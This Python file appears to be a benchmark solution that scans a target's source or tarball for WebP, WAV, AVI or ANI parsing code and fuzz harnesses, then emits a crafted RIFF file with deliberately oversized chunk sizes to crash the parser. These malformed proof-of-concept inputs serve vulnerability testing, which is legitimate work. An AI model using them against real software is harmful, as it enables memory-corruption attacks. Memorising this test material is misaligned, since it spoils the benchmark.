import os
import tarfile
from collections import defaultdict
from typing import Dict, Iterable, Tuple


def _le16(x: int) -> bytes:
    return bytes((x & 0xFF, (x >> 8) & 0xFF))


def _le32(x: int) -> bytes:
    return bytes((x & 0xFF, (x >> 8) & 0xFF, (x >> 16) & 0xFF, (x >> 24) & 0xFF))


def _make_riff(form_type: bytes, chunks: Iterable[Tuple[bytes, bytes, int | None]]) -> bytes:
    data = bytearray()
    data += form_type
    for ckid, payload, declared_size in chunks:
        if declared_size is None:
            declared_size = len(payload)
        data += ckid
        data += _le32(declared_size & 0xFFFFFFFF)
        data += payload
        if (len(payload) & 1) == 1:
            data += b"\x00"
    riff_size = len(data)
    return b"RIFF" + _le32(riff_size) + data


def _poc_wave() -> bytes:
    fmt = bytearray()
    fmt += _le16(1)          # PCM
    fmt += _le16(1)          # channels
    fmt += _le32(8000)       # sample rate
    fmt += _le32(8000)       # byte rate
    fmt += _le16(1)          # block align
    fmt += _le16(8)          # bits/sample
    return _make_riff(
        b"WAVE",
        [
            (b"fmt ", bytes(fmt), None),
            (b"data", b"\x00", 0x100),
        ],
    )


def _poc_webp() -> bytes:
    # VP8X payload (10 bytes):
    #  flags (1), reserved (3), canvas width-1 (3), canvas height-1 (3)
    flags = 0x20  # ICCP present
    vp8x = bytes([flags, 0, 0, 0, 0, 0, 0, 0, 0, 0])  # 1x1 canvas
    return _make_riff(
        b"WEBP",
        [
            (b"VP8X", vp8x, None),
            (b"ICCP", b"\x00", 0x100),
        ],
    )


def _poc_avi() -> bytes:
    # Minimal AVI-like RIFF: LIST(hdrl) with oversized size.
    return _make_riff(
        b"AVI ",
        [
            (b"LIST", b"hdrl", 0x100),
        ],
    )


def _poc_acon() -> bytes:
    # Minimal ACON RIFF: 'anih' chunk with oversized size.
    return _make_riff(
        b"ACON",
        [
            (b"anih", b"", 0x100),
        ],
    )


def _is_probably_text_path(name: str) -> bool:
    low = name.lower()
    if any(low.endswith(ext) for ext in (
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx",
        ".m", ".mm", ".py", ".java", ".js", ".ts", ".rs", ".go",
        ".md", ".rst", ".txt", ".yaml", ".yml", ".toml", ".json",
        ".gn", ".gni", ".bazel", ".bzl", ".cmake", ".mk", "makefile",
        ".sh", ".bat", ".ps1", ".pl",
    )):
        return True
    if "/fuzz" in low or "fuzz" in low or "fuzzer" in low:
        return True
    return False


def _update_scores(scores: Dict[str, int], data: bytes, weight: int) -> None:
    if not data:
        return
    dlow = data.lower()

    # WEBP-related
    scores["WEBP"] += weight * (
        data.count(b"WEBP") +
        data.count(b"VP8X") * 2 +
        data.count(b"VP8L") * 2 +
        data.count(b"VP8 ") * 2 +
        data.count(b"WebP") * 2 +
        data.count(b"WebPDecode") * 4 +
        data.count(b"WebPGetInfo") * 4 +
        dlow.count(b"libwebp") * 5 +
        dlow.count(b"webp")
    )

    # WAVE-related
    scores["WAVE"] += weight * (
        data.count(b"WAVE") * 2 +
        data.count(b"fmt ") * 2 +
        data.count(b"data") +
        dlow.count(b"wav") +
        dlow.count(b"wave") * 2
    )

    # AVI-related
    scores["AVI "] += weight * (
        data.count(b"AVI ") * 3 +
        data.count(b"avih") * 2 +
        data.count(b"LIST") +
        dlow.count(b"avi") * 2
    )

    # ACON/ANI-related
    scores["ACON"] += weight * (
        data.count(b"ACON") * 3 +
        data.count(b"anih") * 2 +
        dlow.count(b".ani") * 3 +
        dlow.count(b"cursor") +
        dlow.count(b"icon")
    )

    # RIFF hint (weak)
    riff_hits = data.count(b"RIFF") + dlow.count(b"riff")
    if riff_hits:
        scores["WEBP"] += weight * riff_hits // 4
        scores["WAVE"] += weight * riff_hits // 4
        scores["AVI "] += weight * riff_hits // 6
        scores["ACON"] += weight * riff_hits // 6


def _scan_dir(root: str) -> Tuple[Dict[str, int], Dict[str, int], bool]:
    scores_global = defaultdict(int)
    scores_fuzzer = defaultdict(int)
    found_fuzzer = False

    total_read = 0
    max_total_read = 12_000_000
    max_file_read = 600_000

    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            path = os.path.join(dirpath, fn)
            rel = os.path.relpath(path, root).replace(os.sep, "/")
            low = rel.lower()

            name_bonus = 0
            if "webp" in low:
                name_bonus += 40
            if "wav" in low or "wave" in low:
                name_bonus += 20
            if "avi" in low:
                name_bonus += 20
            if ".ani" in low or "acon" in low:
                name_bonus += 20
            if "fuzz" in low or "fuzzer" in low:
                name_bonus += 80

            for k in ("WEBP", "WAVE", "AVI ", "ACON"):
                scores_global[k] += name_bonus // 4

            if not _is_probably_text_path(rel):
                continue

            try:
                st = os.stat(path)
                if st.st_size <= 0:
                    continue
                if st.st_size > 5_000_000 and ("fuzz" not in low and "fuzzer" not in low):
                    continue
                to_read = min(max_file_read, st.st_size)
                with open(path, "rb") as f:
                    data = f.read(to_read)
            except OSError:
                continue

            if not data:
                continue

            total_read += len(data)
            if total_read > max_total_read:
                return scores_global, scores_fuzzer, found_fuzzer

            is_fuzzer = b"LLVMFuzzerTestOneInput" in data
            if is_fuzzer:
                found_fuzzer = True
                _update_scores(scores_fuzzer, data, 100)
            _update_scores(scores_global, data, 1)

    return scores_global, scores_fuzzer, found_fuzzer


def _scan_tar(path: str) -> Tuple[Dict[str, int], Dict[str, int], bool]:
    scores_global = defaultdict(int)
    scores_fuzzer = defaultdict(int)
    found_fuzzer = False

    total_read = 0
    max_total_read = 12_000_000
    max_file_read = 600_000

    try:
        with tarfile.open(path, mode="r:*") as tf:
            members = tf.getmembers()
            for m in members:
                if not m.isfile():
                    continue
                name = m.name or ""
                low = name.lower()

                name_bonus = 0
                if "webp" in low:
                    name_bonus += 40
                if "wav" in low or "wave" in low:
                    name_bonus += 20
                if "avi" in low:
                    name_bonus += 20
                if ".ani" in low or "acon" in low:
                    name_bonus += 20
                if "fuzz" in low or "fuzzer" in low:
                    name_bonus += 80

                for k in ("WEBP", "WAVE", "AVI ", "ACON"):
                    scores_global[k] += name_bonus // 4

                if not _is_probably_text_path(name) and ("fuzz" not in low and "fuzzer" not in low):
                    continue
                if m.size <= 0:
                    continue
                if m.size > 5_000_000 and ("fuzz" not in low and "fuzzer" not in low):
                    continue

                to_read = min(max_file_read, m.size)
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read(to_read)
                except Exception:
                    continue

                if not data:
                    continue

                total_read += len(data)
                if total_read > max_total_read:
                    break

                is_fuzzer = b"LLVMFuzzerTestOneInput" in data
                if is_fuzzer:
                    found_fuzzer = True
                    _update_scores(scores_fuzzer, data, 100)
                _update_scores(scores_global, data, 1)
    except Exception:
        return scores_global, scores_fuzzer, found_fuzzer

    return scores_global, scores_fuzzer, found_fuzzer


def _choose_form(src_path: str) -> str:
    if os.path.isdir(src_path):
        g, f, has_fuzzer = _scan_dir(src_path)
    else:
        g, f, has_fuzzer = _scan_tar(src_path)

    scores = f if has_fuzzer else g
    best_key = None
    best_score = -1
    for k in ("WEBP", "WAVE", "AVI ", "ACON"):
        sc = int(scores.get(k, 0))
        if sc > best_score:
            best_score = sc
            best_key = k

    if best_key is None or best_score <= 0:
        return "WAVE"
    return best_key


class Solution:
    def solve(self, src_path: str) -> bytes:
        form = _choose_form(src_path)
        if form == "WEBP":
            return _poc_webp()
        if form == "AVI ":
            return _poc_avi()
        if form == "ACON":
            return _poc_acon()
        return _poc_wave()